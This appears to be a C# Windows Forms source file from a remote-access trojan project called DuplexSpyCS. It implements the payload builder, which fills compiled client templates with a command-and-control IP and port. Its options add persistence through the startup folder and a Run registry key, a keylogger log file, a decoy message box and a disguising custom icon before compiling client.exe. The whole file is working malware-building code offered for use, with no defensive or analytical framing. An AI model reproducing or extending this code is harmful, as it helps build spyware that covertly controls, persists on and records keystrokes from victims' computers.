using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace DuplexSpyCS
{
    public partial class frmBuild : Form
    {
        /* .o0o.---------------[ README ]---------------.o0o.
         * Payload builder
         * 
         * Introduction:
         * Build Windows payload with specified parameters.
         * 
         * Type of payload:
         * 1. Merged: All in one payload, run it directly.
         * 2. Small: Need to be invoked.
         * 3. Tipoff: Need password to be invoked.
         * 
         * How it works:
         * Read *.il file, replace parameters, compile it using "ilasm.exe".
         * 
         * Done:
         * - winClient48
         * - MessageBox
         * - Copy to specified directory.
         * - Copy to startup.
         * - Set "Run" registry.
         * 
         * Todo:
         * - UAC prompt
         * - Small
         * - Tipoff
         * 
         * .o0o.---------------[ README ]---------------.o0o.
         */

        private IniManager ini_manager = C2.ini_manager;
        private Image imgExeIcon;

        private BuildConfig buildConfig;
        private MsgBoxConfig msgboxConfig;

        [DllImport("shell32.dll")]
        private static extern void SHChangeNotify(int wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

        private const int SHCNE_ASSOCCHANGED = 0x08000000;
        private const int SHCNF_IDLIST = 0x0000;

        public frmBuild()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Print "information" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsInfo(string msg)
        {
            richTextBox1.SelectionColor = Color.Blue;
            richTextBox1.AppendText("[*] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Print "OK" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsOK(string msg)
        {
            richTextBox1.SelectionColor = Color.Lime;
            richTextBox1.AppendText("[+] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Print "Error" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsErr(string msg)
        {
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.AppendText("[-] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Validate build configuration.
        /// </summary>
        /// <param name="config"></param>
        /// <returns></returns>
        bool ValidateBuildConfig(BuildConfig config)
        {
            try
            {
                if (string.IsNullOrEmpty(config.szIP))
                    throw new Exception("Server IP is null or empty.");
                else
                    IPAddress.Parse(config.szIP); //throw exception if parse failed.

                if (config.dwPort <= 1024 || config.dwPort >= 65536)
                    throw new Exception("Invalid port value.");

                if (config.dwTimeout < 0)
                    throw new Exception("Invalid timeout value.");

                if (config.dwRetry < 0)
                    throw new Exception("Invalid retry value.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BuildConfig structure data error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                logsErr(ex.Message);

                return false;
            }
        }

        /// <summary>
        /// Change file icon using ResourceHacker.exe
        /// </summary>
        /// <param name="szExeFile"></param>
        /// <returns></returns>
        bool ChangeIcon(string szExeFile)
        {
            if (imgExeIcon != null)
            {
                string szTmpIcoFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".ico");
                imgExeIcon.Save(szTmpIcoFile, ImageFormat.Icon);
                logsInfo("Icon temp file: " + szTmpIcoFile);

                using (Bitmap bmp = new Bitmap(imgExeIcon, new Size(64, 64)))
                {
                    using (Icon icon = Icon.FromHandle(bmp.GetHicon()))
                    {
                        using (FileStream fs = new FileStream(szTmpIcoFile, FileMode.Create))
                        {
                            icon.Save(fs);
                        }
                    }
                }

                if (!File.Exists(szTmpIcoFile))
                {
                    logsErr("Write icon file error.");
                    return false;
                }

                //Run ResourceHacker.exe
                string szRH = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Tools",
                    "ResourceHacker.exe",
                });

                if (!File.Exists(szRH))
                {
                    logsErr("ResourceHacker.exe not found");
                    return false;
                }

                ProcessStartInfo psi = new ProcessStartInfo()
                {
                    FileName = szRH,
                    Arguments = $"-open \"{szExeFile}\" -save \"{szExeFile}\" -action addoverwrite -res \"{szTmpIcoFile}\" -mask ICONGROUP,1,",
                };
                Process p = new Process();
                p.StartInfo = psi;
                p.Start();

                p.WaitForExit();

                File.Delete(szTmpIcoFile);
                logsInfo("Deleted temp file: " + szTmpIcoFile);

                logsInfo("Call SHChangeNotify()");
                SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
            }
            else
            {
                logsErr("No icon selected");
                return false;
            }

            return true;
        }

        /// <summary>
        /// Compile client exe from il assembly.
        /// </summary>
        /// <param name="output_file">Output exe file.</param>
        /// <param name="srcContent">IL assembly code.</param>
        /// <returns></returns>
        bool CompileFromIL(string szType, string output_file, string srcContent)
        {
            /* How it work:
             * Write srcContent(Payload) into temp file,
             * compile the il assembly code using ilasm: ilasm tmp.il /debug /output:output_file.
             * Delete temp file.
             * Change output exe file icon(If specified).
             */

            //TODO
            try
            {
                if (File.Exists(output_file))
                    File.Delete(output_file);

                string ilasm_file = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Tools",
                    "ilasm.exe",
                });

                string tmp_file = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Payload",
                    szType,
                    Path.GetRandomFileName(),
                });

                File.WriteAllText(tmp_file, srcContent);

                Process proc = new Process();
                proc.StartInfo = new ProcessStartInfo()
                {
                    FileName = ilasm_file,
                    Arguments = $"\"{tmp_file}\" /debug /out:\"{output_file}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                proc.Start();

                string szOutput = proc.StandardOutput.ReadToEnd();
                string szError = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                string szLogDir = Path.Combine(Application.StartupPath, "Logs");
                if (!Directory.Exists(szLogDir))
                    Directory.CreateDirectory(szLogDir);

                logsInfo("Output of ilasm.exe will be stored in the following *.log file.");
                string szOutFile = Path.Combine(szLogDir, "build_stdout.log");
                string szErrFile = Path.Combine(szLogDir, "build_stderr.log");

                File.WriteAllText(szOutFile, szOutput);
                File.WriteAllText(szErrFile, szErrFile);

                if (buildConfig.bIcon)
                {
                    if (!ChangeIcon(output_file))
                    {
                        logsErr("Change file icon error.");
                    }
                }

                File.Delete(tmp_file);

                return File.Exists(output_file);
            }
            catch (Exception ex)
            {
                logsErr(ex.Message);
                return false;
            }
        }

        /// <summary>
        /// Build client exe file.
        /// </summary>
        /// <param name="filePath"></param>
        void Build(string filePath)
        {
            tabControl1.SelectedIndex = tabControl1.TabPages.Count - 1; //Select Last Page

            buildConfig = new BuildConfig()
            {
                /* Necessary Data */
                szIP = textBox1.Text, //Server IP address
                dwPort = (int)numericUpDown1.Value, //Server listening port.
                dwTimeout = (int)numericUpDown2.Value, //Client connection timeout(ms).
                dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).
                dwInterval = (int)numericUpDown4.Value, //Send inform interval(ms).
                szPrefix = textBox2.Text,

                //Install
                bCopyDir = checkBox1.Checked,
                szCopyDir = comboBox1.Text,
                bCopyStartUp = checkBox2.Checked,
                szStartUpName = textBox3.Text,
                bRegistry = checkBox3.Checked,
                szRegKeyName = textBox4.Text,

                //Misc
                szKeylogFileName = textBox5.Text, //Keylogger file
                bMsgBox = checkBox4.Checked, //Enable message box.
                msgboxConfig = msgboxConfig, //Message box configuration.
                bIcon = checkBox5.Checked,
            };

            //Validate configuration, stop build client exe file if validation is failed.
            if (!ValidateBuildConfig(buildConfig))
                return;

            buildConfig.clntType = (ClientType)Enum.Parse(typeof(ClientType), comboBox2.Text);

            //Client source file path.
            string szIL = Path.Combine(
                new string[]
                {
                    Application.StartupPath,
                    "Payload",
                    buildConfig.clntType.ToString(),
                    $"{buildConfig.clntType}.il",
                }
            );

            if (File.Exists(szIL))
            {
                string szPayload = File.ReadAllText(szIL);
                if (string.IsNullOrEmpty(szPayload))
                {
                    MessageBox.Show("File content is null or empty:\n" + szIL, "IsNullOrEmpty()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                //Set value
                szPayload = (szPayload

                    //General
                    .Replace("[IP]", buildConfig.szIP)
                    .Replace("[PORT]", buildConfig.dwPort.ToString())
                    .Replace("[INTERVAL]", buildConfig.dwInterval.ToString())
                    .Replace("[TIMEOUT]", buildConfig.dwTimeout.ToString()) //ms
                    .Replace("[RETRY]", buildConfig.dwRetry.ToString()) //ms
                    .Replace("[PREFIX]", buildConfig.szPrefix)

                    //Install
                    .Replace("[IS_CP_DIR]", buildConfig.bCopyDir ? "true" : "false")
                    .Replace("[IS_SZ_DIR]", buildConfig.szCopyDir)
                    .Replace("[IS_CP_STARTUP]", buildConfig.bCopyStartUp ? "true" : "false")
                    .Replace("[IS_SZ_STARTUP]", buildConfig.szStartUpName)
                    .Replace("[IS_REG]", buildConfig.bRegistry ? "true" : "false")
                    .Replace("[IS_REG_KEY]", buildConfig.szRegKeyName)

                    //Misc
                    .Replace("[KL_FILE]", buildConfig.szKeylogFileName)
                    .Replace("[MB_ENABLE]", buildConfig.bMsgBox ? "true" : "false")
                    .Replace("[MB_CAPTION]", buildConfig.msgboxConfig.caption)
                    .Replace("[MB_TEXT]", buildConfig.msgboxConfig.context)
                    .Replace("[MB_BTN]", buildConfig.msgboxConfig.button.ToString())
                    .Replace("[MB_ICON]", buildConfig.msgboxConfig.icon.ToString())

                    //Tipoff
                    .Replace("[SHA256_PASSWORD]", textBox7.Text)

                    //Other
                    .Replace("-nan(ind)", "0x7FF8000000000000")
                    //.Replace("inf", "3.40282347E+38")
                );

                string szDirName = Path.GetDirectoryName(filePath); //Directory path.
                string szFileName = Path.GetFileNameWithoutExtension(filePath); //Filename without extension.
                string szPdbFile = $"{szDirName}\\{szFileName}.pdb"; //Debug file.
                bool bExists = File.Exists(szPdbFile);

                if (CompileFromIL(buildConfig.clntType.ToString(), filePath, szPayload))
                {
                    logsOK("Compile successfully.");

                    if (File.Exists(szPdbFile) && !bExists)
                    {
                        logsInfo("Delete pdb file: " + szPdbFile);
                        File.Delete(szPdbFile);
                    }

                    //Print message.
                    logsOK("Build client successfully: " + filePath);
                    logsOK("*******************************************");
                    logsOK("Finished");
                    logsOK("*******************************************");
                }
                else
                {
                    logsErr("Build client failed.");
                }
            }
            else
            {
                MessageBox.Show("File not found:\n" + szIL, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Test server listen port.
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        void ConnTest(string ip, int port)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SendTimeout = (int)numericUpDown2.Value;
                socket.Connect(ip, port);
                socket.Close();
                MessageBox.Show("Connect successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnSetup()
        {
            try
            {
                if (ini_manager == null)
                {
                    MessageBox.Show("ini_manager is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Close();
                    return;
                }
                else
                {
                    string ReadIni(string section, string key)
                    {
                        return ini_manager.Read(section, key);
                    }

                    //General
                    string szIP = "127.0.0.1"; //Server IP address.
                    int dwPort = int.Parse(ReadIni("General", "listen_port")); //Server listening port.

                    int dwTimeout = int.Parse(ReadIni("Build", "timeout")); //ms
                    int dwRetry = int.Parse(ReadIni("Build", "retry")); //ms
                    int dwInterval = int.Parse(ReadIni("Build", "interval")); //ms

                    textBox1.Text = szIP; //Server IP address.
                    numericUpDown1.Value = dwPort; //Server listening port.

                    numericUpDown2.Value = dwTimeout; //Client connection timeout(ms).
                    numericUpDown3.Value = dwRetry;  //Client retry interval(ms).
                    numericUpDown4.Value = dwInterval; //Send info interval(ms).

                    //Payload
                    string szDirPayload = Path.Combine(Application.StartupPath, "Payload");
                    if (Directory.Exists(szDirPayload))
                    {
                        foreach (string szDir in Directory.GetDirectories(szDirPayload))
                        {
                            string szDirName = Path.GetFileName(szDir);
                            string szPayloadName = $"{szDirName}.il";
                            string szPayloadPath = Path.Combine(szDir, szPayloadName);
                            if (!File.Exists(szPayloadPath))
                            {
                                MessageBox.Show("Payload not found: " + szPayloadPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                continue;
                            }

                            comboBox2.Items.Add(szDirName);
                        }

                        if (comboBox2.Items.Count > 0)
                            comboBox2.SelectedIndex = 0;
                    }
                    else
                    {
                        MessageBox.Show("Directory not found: " + szDirPayload, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                    //Install
                    checkBox1.Checked = ReadIni("Build", "bDirectory") == "1";
                    comboBox1.SelectedIndex = 0;
                    checkBox2.Checked = ReadIni("Build", "bStartUp") == "1";
                    textBox3.Text = ReadIni("Build", "szStartUpName");
                    checkBox3.Checked = ReadIni("Build", "bRegistry") == "1";
                    textBox4.Text = ReadIni("Build", "szRegKeyName");

                    //Misc
                    textBox5.Text = ReadIni("Keylogger", "file");
                    checkBox4.Checked = ReadIni("Build", "use_msg_box") == "1";
                    checkBox5.Checked = ReadIni("Build", "use_icon") == "1";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Test Connection
        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(() => ConnTest(textBox1.Text, (int)numericUpDown1.Value)).Start();
        }

        //Build
        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "client.exe";
            sfd.Filter = "Executable File(*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    Build(sfd.FileName);
                }
                catch (Exception ex)
                {
                    logsErr(ex.Message);
                }
            }
        }

        //Help
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Build\\Help").Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            frmBuildMsgbox f = new frmBuildMsgbox();
            f.Text = "Msgbox config";

            f.ShowDialog();

            msgboxConfig = f.config;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            frmBuildIconPicker f = new frmBuildIconPicker();
            f.Text = "Icon Picker";

            f.ShowDialog();

            imgExeIcon = f.exe_icon;
            if (imgExeIcon != null)
                pictureBox1.Image = imgExeIcon;

            f.Dispose();
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked && (string.IsNullOrEmpty(msgboxConfig.caption) && string.IsNullOrEmpty(msgboxConfig.context)))
            {
                frmBuildMsgbox f = new frmBuildMsgbox();
                f.Text = "Msgbox config";

                f.ShowDialog();

                msgboxConfig = f.config;
            }
        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {
            textBox7.Text = string.IsNullOrEmpty(textBox6.Text) ? string.Empty : Crypto.fnSha256(textBox6.Text);
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox2.Text == "Tipoff")
            {
                textBox6.Enabled = true;
                textBox7.Enabled = true;
            }
            else
            {
                textBox6.Enabled = false;
                textBox7.Enabled = false;
            }
        }
    }
}
